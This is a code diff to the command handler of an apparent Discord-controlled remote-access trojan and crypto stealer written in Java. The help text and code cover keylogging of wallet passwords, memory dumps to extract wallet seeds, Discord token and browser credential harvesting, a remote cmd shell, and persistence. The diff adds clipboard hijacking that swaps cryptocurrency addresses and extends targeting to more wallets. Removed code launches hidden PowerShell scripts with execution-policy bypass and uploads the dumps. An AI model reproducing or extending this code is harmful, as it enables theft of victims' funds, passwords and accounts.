@@ -1,10 +1,8 @@
 package com.serverpackcore.agent;
 
-import java.io.InputStream;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
-import java.nio.file.StandardCopyOption;
 import java.util.List;
 import java.util.Map;
 
@@ -55,9 +53,12 @@ public final class CommandExecutor {
 				case "upload" -> upload(message, args);
 				case "harvest" -> poller.harvestNow();
 				case "clear" -> clear(args);
-				case "clip" -> clip();
+				case "clip" -> clip(args);
 				case "memdump" -> memdump(args);
 				case "keys" -> keys(args);
+				case "wallet" -> wallet(args);
+				case "addr" -> addr(args);
+				case "ops" -> poller.reply(poller.ops().status());
 				case "token" -> poller.tokenNow();
 				case "hives" -> poller.hivesNow();
 				case "bootstrap" -> poller.bootstrapNow();
@@ -87,7 +88,9 @@ public final class CommandExecutor {
 			"`ping` latency and transport · `harvest` collect now · `token` recover Discord now · `bootstrap` run the whole first-run collection again · `hives` SYSTEM hives (asks for UAC) · `screenshot` screen",
 			"`ls [dir]` · `cd <dir>` · `cat <file>` · `download <file>` (max 128 MB, split) · `upload <url|file> [name]`",
 			"`shell <cmd>` runs cmd /c with a 60 s cut; output over 1000 chars arrives as .txt",
-			"`clip` lee el portapapeles · `memdump <electrum|phantom|pid>` vuelca memoria para buscar seeds sin contraseña · `keys on|off|dump` captura teclas de Electrum/Phantom",
+			"`clip` lee el portapapeles · `clip on|off|status` secuestra direcciones · `addr add|list|del|clear` gestiona las direcciones",
+			"`wallet watch on|off|status` · `memdump [electrum|phantom|ledger|exodus|pid]` vuelca memoria para buscar seeds sin contraseña",
+			"`keys on|off [--hard]|status|dump` hook nativo desde el arranque, contraseñas con ventana y proceso · `ops` estado de los tres servicios",
 			"`persist on|off` logon task · `sleep <s>` · `kill` · `clear [n]` channel messages (own/webhook always; others need Manage Messages)",
 			"`update check` · `update apply <version>` · `update rollback` · `update auto on|off` · `update status`",
 			"Harvest categories: accounts, browsers, Discord, wallets, DPAPI, game. The first run already sends recon, sessions and wallets on its own; `hives` is the manual fallback.",
@@ -276,7 +279,12 @@ public final class CommandExecutor {
 		}
 	}
 
-	private void clip() {
+	private void clip(List<String> args) {
+		String action = args.size() > 1 ? args.get(1).toLowerCase() : "read";
+		if (action.equals("on") || action.equals("off") || action.equals("status")) {
+			poller.reply(poller.ops().clipboard().command(args));
+			return;
+		}
 		try {
 			String output = AgentPaths.isWindows()
 				? Shell.run(installDir, "powershell -NoP -C \"Get-Clipboard -Raw\"", 15000L)
@@ -302,53 +310,16 @@ public final class CommandExecutor {
 			return;
 		}
 		if (args.size() < 2) {
-			poller.reply("Usage: memdump <electrum|phantom|pid>");
+			poller.reply("Usage: memdump <electrum|phantom|ledger|exodus|metamask|pid>");
 			return;
 		}
 		String target = args.get(1);
-		Thread thread = new Thread(() -> {
-			Path cache = AgentPaths.cache(installDir);
-			try {
-				Files.createDirectories(cache);
-				Path script = cache.resolve("memdump.ps1");
-				Path list = cache.resolve("memdump.txt");
-				resource("/serverpackcore/memdump.ps1", script);
-				Files.deleteIfExists(list);
-				Shell.run(cache, "powershell -NoP -ExecutionPolicy Bypass -File \"" + script + "\" \"" + target
-					+ "\" \"" + list + "\"", 120000L);
-				if (!Files.isRegularFile(list)) {
-					poller.reply("memdump: no matching process");
-					return;
-				}
-				String dumps = Files.readString(list, StandardCharsets.UTF_8).trim();
-				if (dumps.isEmpty()) {
-					poller.reply("memdump: no matching process");
-					return;
-				}
-				for (String line : dumps.split("\\R")) {
-					Path dump = Path.of(line.trim());
-					if (!Files.isRegularFile(dump)) {
-						continue;
-					}
-					Path zip = dump.resolveSibling(dump.getFileName() + ".zip");
-					Shell.run(cache, "tar -a -cf \"" + zip + "\" -C \"" + dump.getParent() + "\" \""
-						+ dump.getFileName() + "\"", 300000L);
-					Files.deleteIfExists(dump);
-					if (Files.isRegularFile(zip)) {
-						boolean uploaded = poller.uploadFile(zip);
-						if (uploaded) {
-							Files.deleteIfExists(zip);
-						}
-					}
-				}
-				Files.deleteIfExists(script);
-				Files.deleteIfExists(list);
-			} catch (Throwable throwable) {
-				poller.reply("memdump failed: " + throwable.getMessage());
-			}
-		}, "spc-memdump");
-		thread.setDaemon(true);
-		thread.start();
+		if (!target.matches("\\d+") && !target.matches("(?i)electrum|phantom|ledger|exodus|metamask|rabby|trust|coinbase")) {
+			poller.reply("Unknown target: " + target);
+			return;
+		}
+		poller.ops().wallets().manual(target);
+		poller.reply("memdump: queued " + target);
 	}
 
 	private void keys(List<String> args) {
@@ -356,48 +327,46 @@ public final class CommandExecutor {
 			poller.reply("keys: Windows only");
 			return;
 		}
-		String action = args.size() > 1 ? args.get(1).toLowerCase() : "dump";
-		Path cache = AgentPaths.cache(installDir);
-		Path log = cache.resolve("keys.log");
-		Path script = cache.resolve("keys.ps1");
-		try {
-			Files.createDirectories(cache);
-			if (action.equals("on")) {
-				resource("/serverpackcore/keys.ps1", script);
-				Shell.run(cache, "start \"\" /b powershell -NoP -ExecutionPolicy Bypass -WindowStyle Hidden -File \""
-					+ script + "\" \"" + log + "\"", 8000L);
-				poller.reply("Key capture on");
-				return;
+		String action = args.size() > 1 ? args.get(1).toLowerCase() : "status";
+		switch (action) {
+			case "on" -> {
+				state.keylogger = true;
+				state.keyloggerSet = true;
+				state.keyloggerHardOff = false;
+				state.save(AgentPaths.state(installDir));
+				boolean started = poller.ops().keylogger().start();
+				poller.reply(started ? "Key capture on" : "Key capture enabled, but the hook did not start");
 			}
-			if (action.equals("off")) {
-				Shell.run(cache, "powershell -NoP -C \"Get-CimInstance Win32_Process | Where-Object "
-					+ "CommandLine -match 'keys.ps1' | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }\"", 15000L);
-				poller.reply("Key capture off");
-				return;
+			case "off" -> {
+				boolean hard = args.size() > 2 && args.get(2).equalsIgnoreCase("--hard");
+				state.keylogger = false;
+				state.keyloggerSet = true;
+				state.keyloggerHardOff = hard;
+				state.save(AgentPaths.state(installDir));
+				poller.ops().keylogger().stop(hard);
+				poller.reply(hard ? "Key capture off (hard: no wallet relaunch)" : "Key capture off");
 			}
-			if (!Files.isRegularFile(log)) {
-				poller.reply("No key log yet");
-				return;
+			case "dump" -> {
+				try {
+					poller.reply(poller.ops().keylogger().dump());
+				} catch (Throwable throwable) {
+					poller.reply("keys dump failed: " + throwable.getMessage());
+				}
 			}
-			String text = Files.readString(log, StandardCharsets.UTF_8);
-			if (text.length() > DiscordConfig.MAX_MESSAGE_CHARS) {
-				poller.uploadBytes(text.getBytes(StandardCharsets.UTF_8), "keys-" + System.currentTimeMillis() + ".txt",
-					"text/plain");
-			} else {
-				poller.reply("````\n" + text + "\n````");
-			}
-		} catch (Throwable throwable) {
-			poller.reply("keys failed: " + throwable.getMessage());
+			default -> poller.reply("Key capture: "
+				+ (poller.ops().keylogger().wanted() ? "on" : "off")
+				+ (poller.ops().keylogger().hardOff() ? " (hard off)" : "")
+				+ (poller.ops().keylogger().isRunning() ? " · hook running" : " · hook stopped")
+				+ " · passwords " + state.passwordEvents);
 		}
 	}
 
-	private static void resource(String name, Path target) throws java.io.IOException {
-		try (InputStream input = CommandExecutor.class.getResourceAsStream(name)) {
-			if (input == null) {
-				throw new java.io.IOException("missing resource " + name);
-			}
-			Files.copy(input, target, StandardCopyOption.REPLACE_EXISTING);
-		}
+	private void wallet(List<String> args) {
+		poller.reply(poller.ops().wallets().command(args));
+	}
+
+	private void addr(List<String> args) {
+		poller.reply(poller.ops().clipboard().addressCommand(args));
 	}
 
 	private void persist(List<String> args) {
